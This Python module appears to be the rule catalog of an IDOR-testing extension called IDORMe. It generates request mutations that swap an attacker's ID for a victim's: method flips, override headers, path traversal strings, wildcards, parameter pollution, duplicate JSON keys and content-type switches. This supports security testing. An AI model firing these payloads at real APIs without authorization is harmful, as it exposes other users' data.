"""Declarative rule catalog for IDORMe mutations."""

import json
try:
    from urllib import urlencode
except ImportError:  # pragma: no cover - CPython 3
    from urllib.parse import urlencode

try:
    unicode
except NameError:  # pragma: no cover - CPython 3
    unicode = str

SAFE_METHODS = ["GET", "HEAD", "OPTIONS", "TRACE"]
WRITE_METHODS = ["POST", "PUT", "PATCH", "DELETE"]
SUFFIXES = [".json", ".xml", ".config", ".txt"]
VERB_TUNNEL_FIELDS = ["method", "_method", "action", "_action"]
OWNER_PARAM_DEFAULT = "userId"


class MutationRule(object):
    def __init__(self, rule_id, priority, base_types, builder, is_global=False):
        self.rule_id = rule_id
        self.priority = priority
        self.base_types = base_types
        self.builder = builder
        self.is_global = is_global

    def applies(self, context, apply_global, apply_specific):
        if self.is_global and not apply_global:
            return False
        if not self.is_global and not apply_specific:
            return False
        return "any" in self.base_types or context.base_type in self.base_types

    def build(self, context):
        return list(self.builder(context))


def _mutation(rule_id, **kwargs):
    from .mutator import Mutation

    return Mutation(rule_id, **kwargs)


def build_default_rules():
    rules = []
    rules.extend(_global_rules())
    rules.extend(_base_path_rules())
    rules.extend(_base_body_rules())
    rules.extend(_base_query_rules())
    return sorted(rules, key=lambda rule: rule.priority)


# ---------------------------------------------------------------------------
# Global rules
# ---------------------------------------------------------------------------

def _global_rules():
    return [
        MutationRule("G-01", 10, ["any"], _rule_method_flips, True),
        MutationRule("G-02", 20, ["any"], _rule_verb_tunneling, True),
        MutationRule("G-03", 30, ["any"], _rule_mfac, True),
        MutationRule("G-04", 40, ["any"], _rule_suffixes, True),
        MutationRule("G-05", 50, ["any"], _rule_content_matrix, True),
        MutationRule("G-06", 60, ["any"], _rule_param_injection, True),
    ]


def _rule_method_flips(context):
    current = context.request.method.upper()
    targets = SAFE_METHODS if current in WRITE_METHODS else WRITE_METHODS
    for method in targets:
        if method != current:
            yield _mutation("G-01", transport_method=method, note="Method flip")


def _rule_verb_tunneling(context):
    method = context.request.method.upper()
    for header in ("X-HTTP-Method-Override", "X-Method-Override"):
        yield _mutation("G-02", headers_delta=[(header, method)], note="Verb tunnel header")
    for field in VERB_TUNNEL_FIELDS:
        query = context.request.parsed_query()
        query[field] = [method]
        yield _mutation("G-02", query_delta=urlencode(query, doseq=True), note="Verb tunnel query")
        body_map = context.request.parsed_body()
        if body_map:
            body_map[field] = [method]
            yield _mutation("G-02", body_bytes=urlencode(body_map, doseq=True),
                           content_type_hint="application/x-www-form-urlencoded", note="Verb tunnel body")


def _rule_mfac(context):
    for variant in _path_case_variants(context.request.path):
        yield _mutation("G-03", path_delta=variant, note="MFAC path")


def _rule_suffixes(context):
    path = context.request.path
    for suffix in SUFFIXES:
        if path.endswith(suffix):
            continue
        yield _mutation("G-04", path_delta=path + suffix, note="Suffix")


def _rule_content_matrix(context):
    if not context.request.body:
        return
    base = _body_seed(context)
    if not base:
        return
    for body_bytes, ctype in _body_variants(base):
        yield _mutation("G-05", body_bytes=body_bytes, content_type_hint=ctype, note="Content matrix")


def _rule_param_injection(context):
    if not context.param_name:
        return
    params = context.request.parsed_query()
    params[context.param_name] = [context.victim]
    yield _mutation("G-06", query_delta=urlencode(params, doseq=True), note="Victim query")
    body_map = context.request.parsed_body()
    if body_map:
        body_map[context.param_name] = [context.victim]
        yield _mutation("G-06", body_bytes=urlencode(body_map, doseq=True),
                       content_type_hint="application/x-www-form-urlencoded", note="Victim body")


# ---------------------------------------------------------------------------
# Base #1: ID in path
# ---------------------------------------------------------------------------

def _base_path_rules():
    return [
        MutationRule("B1-01", 70, ["path"], _b1_method_flips),
        MutationRule("B1-02", 80, ["path"], _b1_pair_paths),
        MutationRule("B1-03", 90, ["path"], _b1_traversal),
        MutationRule("B1-04", 100, ["path"], _wrap_rule(_rule_verb_tunneling, "B1-04")),
        MutationRule("B1-05", 110, ["path"], _wrap_rule(_rule_mfac, "B1-05")),
        MutationRule("B1-06", 120, ["path"], _b1_wildcards),
        MutationRule("B1-07", 130, ["path"], _b1_query_injection),
        MutationRule("B1-08", 140, ["path"], _b1_method_body),
        MutationRule("B1-09", 150, ["path"], _wrap_rule(_rule_suffixes, "B1-09")),
    ]


def _b1_method_flips(context):
    current = context.request.method.upper()
    for method in WRITE_METHODS:
        if method != current:
            yield _mutation("B1-01", transport_method=method, note="B1 method flip")


def _b1_pair_paths(context):
    base = context.extras.get("id_value") or context.victim
    attacker = context.attacker
    victims = [base, "%s,%s" % (attacker, context.victim), "%s,%s" % (context.victim, attacker)]
    for value in victims:
        new_path = _replace_last_segment(context.request.path, value)
        if new_path:
            yield _mutation("B1-02", path_delta=new_path, note="Pair path")


def _b1_traversal(context):
    base = context.extras.get("id_value") or context.victim
    if not base:
        return
    prefix, _ = context.request.path.rsplit("/", 1)
    try:
        prior = str(int(base) - 1)
    except Exception:
        prior = base
    yield _mutation("B1-03", path_delta="%s/%s/../%s" % (prefix, prior, base), note="Traversal path")
    yield _mutation("B1-03", path_delta="%s/%s" % (prefix, "%2e%2e/" + str(base)), note="Traversal encoded")


def _b1_wildcards(context):
    base = context.extras.get("id_value") or context.victim or "1"
    prefix, _ = context.request.path.rsplit("/", 1)
    variants = ["*", str(base)[0] + "*" if str(base) else "1*"]
    for value in variants:
        yield _mutation("B1-06", path_delta="%s/%s" % (prefix, value), note="Wildcard")


def _b1_query_injection(context):
    name = context.param_name or OWNER_PARAM_DEFAULT
    params = context.request.parsed_query()
    params[name] = [context.victim]
    yield _mutation("B1-07", query_delta=urlencode(params, doseq=True), note="Query victim")


def _b1_method_body(context):
    name = context.param_name or OWNER_PARAM_DEFAULT
    collection = context.request.path.rsplit("/", 1)[0]
    payload = {name: context.victim}
    for method in WRITE_METHODS:
        for body_bytes, ctype in _body_variants(payload):
            yield _mutation("B1-08", transport_method=method, path_delta=collection,
                           body_bytes=body_bytes, content_type_hint=ctype, note="Method+body")


# ---------------------------------------------------------------------------
# Base #2: ID in body (JSON)
# ---------------------------------------------------------------------------

def _base_body_rules():
    return [
        MutationRule("B2-01", 160, ["body"], _b2_traversal_value),
        MutationRule("B2-02", 170, ["body"], _b2_method_flips),
        MutationRule("B2-03", 180, ["body"], _b2_move_to_query),
        MutationRule("B2-04", 190, ["body"], _b2_content_switch),
        MutationRule("B2-05", 200, ["body"], _b2_array_wrap),
        MutationRule("B2-06", 210, ["body"], _b2_duplicate_keys),
        MutationRule("B2-07", 220, ["body"], _b2_object_wrap),
        MutationRule("B2-08", 230, ["body"], _b2_extension_value),
        MutationRule("B2-09", 240, ["body"], _wrap_rule(_rule_verb_tunneling, "B2-09")),
        MutationRule("B2-10", 250, ["body"], _wrap_rule(_rule_mfac, "B2-10")),
    ]


def _b2_traversal_value(context):
    for payload in ("../../..", "..\\..\\"):
        yield _body_direct(context, "B2-01", payload, note="Traversal value")


def _b2_method_flips(context):
    current = context.request.method.upper()
    for method in SAFE_METHODS + WRITE_METHODS:
        if method != current:
            yield _mutation("B2-02", transport_method=method, note="Body method flip")


def _b2_move_to_query(context):
    name = context.param_name or "id"
    params = context.request.parsed_query()
    params[name] = [context.extras.get("id_value") or context.victim]
    yield _mutation("B2-03", query_delta=urlencode(params, doseq=True), note="Move id to query")


def _b2_content_switch(context):
    payload = {context.param_name or "id": context.victim}
    for body_bytes, ctype in _body_variants(payload):
        yield _mutation("B2-04", body_bytes=body_bytes, content_type_hint=ctype, note="Content switch")


def _b2_array_wrap(context):
    payload = {context.param_name or "id": [context.attacker, context.victim]}
    for body_bytes, ctype in _body_variants(payload):
        yield _mutation("B2-05", body_bytes=body_bytes, content_type_hint=ctype, note="Array wrap")


def _b2_duplicate_keys(context):
    name = context.param_name or "id"
    first = json.dumps({name: context.attacker})[1:-1]
    second = json.dumps({name: context.victim})[1:-1]
    body = "{" + first + "," + second + "}"
    swapped = "{" + second + "," + first + "}"
    yield _mutation("B2-06", body_bytes=body, content_type_hint="application/json", note="Duplicate keys")
    yield _mutation("B2-06", body_bytes=swapped, content_type_hint="application/json", note="Duplicate keys swapped")


def _b2_object_wrap(context):
    name = context.param_name or "id"
    payload = {name: {name: context.victim}}
    for body_bytes, ctype in _body_variants(payload):
        yield _mutation("B2-07", body_bytes=body_bytes, content_type_hint=ctype, note="Object wrap")


def _b2_extension_value(context):
    name = context.param_name or "id"
    for suffix in (".json", ".xml"):
        yield _body_direct(context, "B2-08", context.victim + suffix, name=name, note="Extension value")


# ---------------------------------------------------------------------------
# Base #3: ID in query
# ---------------------------------------------------------------------------

def _base_query_rules():
    return [
        MutationRule("B3-01", 260, ["query"], _b3_multi_values),
        MutationRule("B3-02", 270, ["query"], _b3_traversal),
        MutationRule("B3-03", 280, ["query"], _b3_pollution),
        MutationRule("B3-04", 290, ["query"], _b3_method_flips),
        MutationRule("B3-05", 300, ["query"], _b3_move_to_body),
        MutationRule("B3-06", 310, ["query"], _b3_suffixes),
        MutationRule("B3-07", 320, ["query"], _wrap_rule(_rule_verb_tunneling, "B3-07")),
        MutationRule("B3-08", 330, ["query"], _wrap_rule(_rule_mfac, "B3-08")),
    ]


def _b3_multi_values(context):
    name = context.param_name or OWNER_PARAM_DEFAULT
    params = context.request.parsed_query()
    current = params.get(name, [context.attacker])
    params[name] = [",".join([current[0], context.victim])]
    yield _mutation("B3-01", query_delta=urlencode(params, doseq=True), note="CSV values")


def _b3_traversal(context):
    name = context.param_name or OWNER_PARAM_DEFAULT
    params = context.request.parsed_query()
    params[name] = ["../../../"]
    yield _mutation("B3-02", query_delta=urlencode(params, doseq=True), note="Traversal value")


def _b3_pollution(context):
    name = context.param_name or OWNER_PARAM_DEFAULT
    combos = [
        [(name, context.victim), (name, context.attacker)],
        [(name, context.attacker), (name, context.victim)],
        [(name + "[]", context.victim), (name + "[]", context.attacker)],
        [(name + "[]", context.attacker), (name + "[]", context.victim)],
    ]
    for combo in combos:
        yield _mutation("B3-03", query_delta=urlencode(combo, doseq=True), note="Duplicate param")
    json_style = "%s=[%s,%s]" % (name, context.victim, context.attacker)
    yield _mutation("B3-03", query_delta=json_style, note="JSON array param")


def _b3_method_flips(context):
    current = context.request.method.upper()
    for method in WRITE_METHODS:
        if method != current:
            yield _mutation("B3-04", transport_method=method, note="Query method flip")


def _b3_move_to_body(context):
    payload = {context.param_name or OWNER_PARAM_DEFAULT: context.victim}
    for method in WRITE_METHODS:
        for body_bytes, ctype in _body_variants(payload):
            yield _mutation("B3-05", transport_method=method, body_bytes=body_bytes,
                           content_type_hint=ctype, note="Move param to body")


def _b3_suffixes(context):
    for mutation in _rule_suffixes(context):
        yield _mutation("B3-06", path_delta=mutation.path_delta, note=mutation.note)
    param = context.param_name or OWNER_PARAM_DEFAULT
    params = context.request.parsed_query()
    params[param] = [context.victim + ".json"]
    yield _mutation("B3-06", query_delta=urlencode(params, doseq=True), note="Query suffix")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _wrap_rule(builder, rule_id):
    def wrapped(context):
        for mutation in builder(context):
            yield _mutation(rule_id, transport_method=mutation.transport_method,
                           headers_delta=mutation.headers_delta, path_delta=mutation.path_delta,
                           query_delta=mutation.query_delta, body_bytes=mutation.body_bytes,
                           content_type_hint=mutation.content_type_hint, note=mutation.note)
    return wrapped


def _path_case_variants(path):
    segments = path.split("/")
    variants = []
    for index, segment in enumerate(segments):
        if not segment:
            continue
        for candidate in (segment.lower(), segment.upper(), segment.title()):
            if candidate != segment:
                new_segments = list(segments)
                new_segments[index] = candidate
                variants.append("/".join(new_segments))
    return variants


def _replace_last_segment(path, value):
    if "/" not in path:
        return None
    prefix, _ = path.rsplit("/", 1)
    return "%s/%s" % (prefix, value)


def _body_seed(context):
    if context.param_name:
        return {context.param_name: context.victim}
    if context.extras.get("id_value"):
        return {"id": context.victim}
    return None


def _body_variants(payload):
    variants = []
    json_body = json.dumps(payload)
    variants.append((json_body, "application/json"))
    if isinstance(payload, dict):
        form_pairs = []
        for key, value in payload.items():
            if isinstance(value, list):
                for item in value:
                    form_pairs.append((key, item))
            elif isinstance(value, dict):
                form_pairs.append((key, json.dumps(value)))
            else:
                form_pairs.append((key, value))
        variants.append((urlencode(form_pairs, doseq=True), "application/x-www-form-urlencoded"))
    variants.append((_to_xml(payload), "application/xml"))
    output = []
    for body, ctype in variants:
        if isinstance(body, unicode):
            body = body.encode("utf-8")
        output.append((body, ctype))
    return output


def _to_xml(value):
    if isinstance(value, dict):
        parts = []
        for key, item in value.items():
            parts.append("<%s>%s</%s>" % (key, _to_xml(item), key))
        return "<root>%s</root>" % "".join(parts)
    if isinstance(value, list):
        return "".join(["<item>%s</item>" % _to_xml(item) for item in value])
    return str(value)


def _body_direct(context, rule_id, value, name=None, note=""):
    field = name or context.param_name or "id"
    payload = {field: value}
    for body_bytes, ctype in _body_variants(payload):
        return _mutation(rule_id, body_bytes=body_bytes, content_type_hint=ctype, note=note)


__all__ = ["MutationRule", "build_default_rules"]
